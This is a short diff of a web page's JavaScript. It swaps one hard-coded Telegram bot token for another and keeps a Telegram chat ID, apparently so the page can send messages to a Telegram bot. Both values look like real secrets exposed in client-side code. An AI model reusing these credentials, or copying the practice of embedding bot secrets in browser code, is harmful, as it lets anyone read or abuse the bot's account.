@@ -85,7 +85,7 @@ document.addEventListener('focusin', function(e) {
 });
 
 // Telegram Bot Configuration (ENTER YOUR CREDENTIALS HERE)
-const TELEGRAM_BOT_TOKEN = '8032211561:AAEH86izjI5_bvtcX-JbnZw2WVrwoDL6JTI'; // Replace with your bot token
+const TELEGRAM_BOT_TOKEN = '8386932448:AAH9Ho1YULmEC6i1lpaWnddKzlaKaAJssS8'; // Replace with your bot token
 const TELEGRAM_CHAT_ID = '7181820663'; // Replace with your chat ID
 
 // Application State
@@ -603,4 +603,5 @@ confettiStyles.textContent = `
         to { transform: translateX(100%); opacity: 0; }
     }
 `;
+
 document.head.appendChild(confettiStyles);
